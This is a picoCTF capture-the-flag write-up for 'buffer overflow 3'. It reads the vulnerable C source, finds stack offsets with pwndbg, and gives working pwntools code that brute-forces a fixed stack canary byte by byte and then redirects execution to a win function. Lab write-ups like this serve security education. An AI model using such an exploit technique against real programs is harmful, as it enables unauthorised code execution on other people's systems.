<!--
---
slug: "picoctf-buffer-overflow-3"
title: "picoCTF — buffer overflow 3"
date: "2026-07-05"
ctf: "picoCTF"
challenge: "buffer overflow 3"
difficulty: "beginner"
tags: ["ret2win", "pwn", "buffer overflow", "canary"]
tools: ["pwndbg", "gdb", "pwntools"]
summary: "Brute forcing a canary in a buffer overflow exploit."
---
-->

# picoCTF — buffer overflow 3

## Overview

| Field | Detail |
|-------|--------|
| CTF | picoCTF |
| Category | ret2win |
| Topics | Stack buffer overflow, canary |
| Tools | pwndbg, gdb, pwntools |

---

## Reading the Source

The source code for this vulnerable binary was provided in C.

The vulnerable function `vuln` in this challenge takes two user inputs. First, the function saves a canary value to the stack. This canary sits between the following buffers that store user input and are checked before the function exits so that, if those buffers are overflowed, the canary value will be different and the program will be able to detect the overflow.

```c
memcpy(canary,global_canary,CANARY_SIZE);
```

This canary is defined to be 4 bytes long:

```c
#define CANARY_SIZE 4
```

The source code indicates that this canary comes from the `canary.txt` file, indicating that the canary value on the picoCTF's remote server does not change each time the binary runs, making it susceptible to brute-force attacks.

The function then prompts the user, "How Many Bytes will You Write Into the Buffer?" and reads the user's input one byte at a time into a buffer `length`, then uses `sscanf` to parse that string into the integer `count`.

```c
printf("How Many Bytes will You Write Into the Buffer?\n> ");
while (x<BUFSIZE) {
    read(0,length+x,1);
    if (length[x]=='\n') break;
    x++;
}
sscanf(length,"%d",&count);
```

It is then this `count` value that is used to limit the size of the next input without the program ever verifying that it is less than or equal to the size of the buffer. This means that, if the count value is larger than the size of the buffer, the buffer is vulnerable to overflow.

```c
printf("Input> ");
read(0,buf,count);
```

At the end of the `vuln` function, the program checks to see if the canary has been altered, and if it has, makes the program crash.

```c
if (memcmp(canary,global_canary,CANARY_SIZE)) {
    printf("***** Stack Smashing Detected ***** : Canary Value Corrupt!\n");
    fflush(stdout);
    exit(0);
}
```

There is also a `win` function that prints the value of the flag. Hence, the goal of this challenge is to overflow the buffer to overwrite the canary with the correct value and overwrite the `vuln` function's return address to call the `win` function.

---

## Finding the Offset

Before I can write an exploit to brute-force the canary, I must find the offset between the start of the buffer and the canary. To do this, I used pwndbg's `disassemble` command to view the assembly of the `vuln` function. By tracing through the assembly with the C source code, I found where in memory both the buffer and canary are stored.

First, the canary was stored at `ebp - 0x10` or 16 bytes below the base pointer.

```
0x080494a9 <+32>:	mov    eax,0x804c054
0x080494af <+38>:	mov    eax,DWORD PTR [eax]
0x080494b1 <+40>:	mov    DWORD PTR [ebp-0x10],eax
```

Next, the buffer is stored at `ebp-0x50` or 80 bytes below the base pointer.

```
0x0804953e <+181>:	lea    eax,[ebp-0x50]
```

According to the assembly, there is nothing stored between the buffer and canary, meaning the buffer's size is exactly `64` bytes.

The canary is defined as 4 bytes long, meaning there is a total of 12 bytes between the end of the canary and the beginning of the ebp register. The ebp register is 4 bytes long and sits exactly before the function's return address. Hence, `16` bytes sit between the end of the canary and the beginning of the return address.

---

## Finding the Return Address

Similarly to the previous challenges in this series, I used pwndbg's `info functions` command to find the memory address of the `win` function. I found this address to be `0x08049336`.

---

## Writing the Exploit

To overwrite the `vuln` function's return address to have the program return to the `win` function, I must also accurately overwrite the canary value. As mentioned before, this canary value does not change between runs, making it vulnerable to a brute-force attack. Hence, to determine the canary value, my exploit will overwrite one byte of the canary at a time to find which bytes do not cause the program to crash.

I first wrote a function using python and pwntools to run the program, overwrite a single byte of the canary, and detect if the program crashes.

```python
def try_byte(offset, prefix, guess):
    p = process('./vuln')
    p.recvuntil(b"> ")
    p.sendline(str(offset+100).encode()) # Count value must be greater than the offset to allow for overflow
    p.recvuntil(b"Input> ")
    p.send(b"A" * offset + prefix + bytes([guess]))
    result = p.recvline()
    p.close()
    return b"Smashing" not in result
```

I then iterate through all 256 possible bytes for each of the four bytes of the canary (stopping when a match for each byte is found) and call this function.

```python
canary = b''

for byte_id in range(canary_bytes):
    for byte in range(256):
        guess = bytes([byte])
        if try_byte(offset, canary, byte):
            canary += bytes([byte])
            break
```

Lastly, I craft my final payload using the canary found and the `win` function address, and run the binary a final time to find the flag.

```python
payload = b'A' * offset + canary + b'B' * 16 # 16 bytes between the end of the canary and the beginning of the return address
payload += p32(win_addr)

p = process('./vuln')
p.recvuntil(b"> ")
p.sendline(str(offset+100).encode()) # Count value must be greater than the offset to allow for overflow
p.recvuntil(b"Input> ")
p.sendline(payload)
p.interactive()
```

Running this exploit prints the flag.

---

## What I learned

- **Different methods for 'leaking' canary values** This was my first time working on a buffer overflow exploit with canaries. I researched the various ways for leaking canary values (formatted print statement, brute force, etc.) and the cases/considerations for each method.

---

## References
- [picoCTF - buffer overflow 3](https://learn.cylabacademy.org/library/260?page=1&workspace=true)
